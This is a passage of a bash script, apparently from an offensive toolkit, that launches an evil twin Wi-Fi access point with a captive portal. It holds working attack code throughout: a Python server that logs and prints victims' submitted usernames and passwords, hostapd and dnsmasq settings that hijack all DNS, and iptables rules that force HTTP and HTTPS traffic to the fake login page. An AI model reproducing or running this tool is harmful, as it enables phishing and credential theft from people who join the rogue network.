# Create captive portal log handler
create_logger() {
    cat > "$PORTAL_DIR/logger.py" << 'PYEOF'
#!/usr/bin/env python3
"""Captive portal credential logger for ZERO-DAY OS evil twin"""
import http.server, socketserver, urllib.parse, os, sys, datetime

LOG_FILE = os.environ.get("CAPTIVE_LOG", "/tmp/captive_creds.log")
PORTAL_DIR = os.environ.get("PORTAL_DIR", ".")

class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path in ["/", "/index.html", "/login", "/captive"]:
            self.send_response(302)
            self.send_header("Location", "/index.html")
            self.end_headers()
        else:
            super().do_GET()

    def do_POST(self):
        if self.path == "/login":
            content_length = int(self.headers.get("Content-Length", 0))
            post_data = self.request.rfile.read(content_length).decode("utf-8")
            params = urllib.parse.parse_qs(post_data)

            username = params.get("username", [""])[0]
            password = params.get("password", [""])[0]

            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            client_ip = self.client_address[0]

            log_entry = f"[{timestamp}] {client_ip} - Username: {username} Password: {password}\n"
            
            with open(LOG_FILE, "a") as f:
                f.write(log_entry)

            print(f"\033[32m[+] CAPTURED: {username}:{password} from {client_ip}\033[0m")
            sys.stdout.flush()

            # Redirect to "success" page
            self.send_response(302)
            self.send_header("Location", "/success.html")
            self.end_headers()

            # Create success page
            with open(os.path.join(PORTAL_DIR, "success.html"), "w") as f:
                f.write("""<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Connected</title><style>*{margin:0;padding:0}body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f5f5}
.card{text-align:center;padding:32px;background:white;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,0.1)}
.icon{font-size:48px;margin-bottom:16px}h1{color:#4caf50;margin-bottom:8px}p{color:#666}</style></head>
<body><div class="card"><div class="icon">✅</div><h1>Connected!</h1><p>You are now connected to the network.</p></div></body></html>""")
        else:
            self.send_error(404)

    def log_message(self, format, *args):
        pass  # Suppress default logging

os.chdir(PORTAL_DIR)
handler = CaptivePortalHandler
with socketserver.TCPServer(("", 80), handler) as httpd:
    httpd.serve_forever()
PYEOF
    chmod +x "$PORTAL_DIR/logger.py"
}

# Setup hostapd
generate_portal "$PORTAL" "$PORTAL_DIR"
create_logger

HOSTAPD_CONF=$(mktemp)
DNSMASQ_CONF=$(mktemp)

cat > "$HOSTAPD_CONF" << EOF
interface=$AP_IFACE
driver=nl80211
ssid="$ESSID"
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=zerodayhack
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
EOF

cat > "$DNSMASQ_CONF" << EOF
interface=$AP_IFACE
dhcp-range=$AP_DHCP_START,$AP_DHCP_END,$AP_NETMASK,12h
dhcp-option=3,$AP_IP
dhcp-option=6,$AP_IP
address=/#/$AP_IP
log-queries
log-dhcp
log-facility=$LOOT/dns_queries_${TIMESTAMP}.log
EOF

echo "[*] Configuring $AP_IFACE with IP $AP_IP..."
ip addr flush dev "$AP_IFACE"
ip addr add "$AP_IP/24" dev "$AP_IFACE"
ip link set "$AP_IFACE" up

echo "[*] Starting hostapd..."
hostapd -B "$HOSTAPD_CONF"

sleep 2

echo "[*] Starting dnsmasq (DHCP + DNS hijack)..."
dnsmasq -C "$DNSMASQ_CONF"

echo "[*] Starting captive portal server on port 80..."
export CAPTIVE_LOG="$CAPTIVE_LOG"
export PORTAL_DIR="$PORTAL_DIR"
python3 "$PORTAL_DIR/logger.py" &
LOGGER_PID=$!

echo "[*] Enabling NAT..."
iptables -t nat -A POSTROUTING -o "$INET_IFACE" -j MASQUERADE
iptables -A FORWARD -i "$AP_IFACE" -o "$INET_IFACE" -j ACCEPT
iptables -A FORWARD -i "$INET_IFACE" -o "$AP_IFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -t nat -A PREROUTING -i "$AP_IFACE" -p tcp --dport 80 -j REDIRECT --to-port 80
iptables -t nat -A PREROUTING -i "$AP_IFACE" -p tcp --dport 443 -j REDIRECT --to-port 80
echo 1 > /proc/sys/net/ipv4/ip_forward

echo ""
echo "╔══════════════════════════════════════════════════╗"
echo "║  EVIL TWIN + CAPTIVE PORTAL ACTIVE               ║"
echo "║                                                  ║"
echo "║  ESSID: $ESSID"
echo "║  AP IP:  $AP_IP"
echo "║  Password: zerodayhack"
echo "║  Portal:  $PORTAL"
echo "║                                                  ║"
echo "║  Credentials will appear below as captured:       ║"
echo "║  [+] CAPTURED: username:password from IP          ║"
echo "║                                                  ║"
echo "║  Log file: $CAPTIVE_LOG"
echo "║  DNS log:  $LOOT/dns_queries_${TIMESTAMP}.log"
echo "║                                                  ║"
echo "║  Press Ctrl+C to stop                           ║"
echo "╚══════════════════════════════════════════════════╝"
echo ""

cleanup() {
    echo ""
    echo "[*] Stopping Evil Twin..."
    kill "$LOGGER_PID" 2>/dev/null
    kill $(pgrep -f "hostapd.*$AP_IFACE") 2>/dev/null
    kill $(pgrep -f "dnsmasq.*$AP_IFACE") 2>/dev/null
    iptables -t nat -D POSTROUTING -o "$INET_IFACE" -j MASQUERADE 2>/dev/null
    iptables -t nat -D PREROUTING -i "$AP_IFACE" -p tcp --dport 80 -j REDIRECT --to-port 80 2>/dev/null
    iptables -t nat -D PREROUTING -i "$AP_IFACE" -p tcp --dport 443 -j REDIRECT --to-port 80 2>/dev/null
    iptables -D FORWARD -i "$AP_IFACE" -o "$INET_IFACE" -j ACCEPT 2>/dev/null
    iptables -D FORWARD -i "$INET_IFACE" -o "$AP_IFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null
    echo 0 > /proc/sys/net/ipv4/ip_forward
    ip addr flush dev "$AP_IFACE"
    rm -f "$HOSTAPD_CONF" "$DNSMASQ_CONF"
    echo "[+] Evil Twin stopped."
    echo "[+] Credentials saved: $CAPTIVE_LOG"
    if [ -f "$CAPTIVE_LOG" ]; then
        echo ""
        echo "[*] Captured credentials:"
        cat "$CAPTIVE_LOG"
    fi
    exit 0
}

trap cleanup INT TERM

# Monitor for connections
while true; do
    if [ -f "/var/lib/misc/dnsmasq.leases" ]; then
        CLIENTS=$(wc -l < "/var/lib/misc/dnsmasq.leases" 2>/dev/null || echo "0")
        if [ "$CLIENTS" -gt 0 ]; then
            printf "\r[*] Connected clients: %d   " "$CLIENTS"
        fi
    fi
    sleep 5
done